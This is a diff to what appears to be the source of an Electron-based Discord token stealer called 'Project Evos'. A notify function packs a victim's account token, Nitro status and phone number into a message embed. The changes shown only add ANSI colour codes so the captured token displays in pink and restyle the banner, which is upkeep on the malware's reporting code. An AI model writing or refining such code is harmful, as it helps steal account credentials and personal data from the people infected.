@@ -8,6 +8,13 @@ const { exec } = require('child_process');
 const { promisify } = require('util');
 const { BrowserWindow, session } = require('electron');
 
+const boldpink = "\x1b[35m", 
+boldteal = "\x1b[36m", 
+boldgreen = "\x1b[32m", 
+boldblue = "\x1b[34m",
+boldred = "\x1b[31m", 
+boldgray = "\x1b[37m";
+
 const execCommand = async (command, options = {}) => {
     try {
         const { stdout, stderr } = await promisify(exec)(command, options);
@@ -256,7 +263,7 @@ const notify = async (ctx, token, user) => {
 
     ctx.embeds[0].fields.unshift({
         name: `Token:`,
-        value: `\`\`\`${token}\`\`\``,
+        value: '```ansi\n' + `${boldpink}${token}`+ '\x1b[0m```',
         inline: false
     })
 
@@ -266,7 +273,7 @@ const notify = async (ctx, token, user) => {
 
     ctx.embeds[0].fields.push(
         // { name: "\u200b", value: `\n\`\`\`${arrow}\`\`\``, inline: false },
-        {name: "\u200b",value: `\`\`\`\n⊱≼≽⊰⊹═════⊹⊱≼Project Evos≽⊰⊹═════⊹⊱\n\`\`\``,inline: false},
+        {name: "\u200b",value: `\`\`\`\n\x1b[1;30m⊱≼≽⊰⊹═════⊹⊱≼Project Evos≽⊰⊹═════⊹⊱≼≽⊰\x1b[0m\n\`\`\``,inline: false},
         { name: "Nitro", value: `\`${nitro}\``, inline: true },
         { name: "Phone", value: `\`${user.phone}\`` ? `\`${user.phone}\`` : 'x', inline: true },
         // { name: "\u200b", value: "\u200b", inline: false },
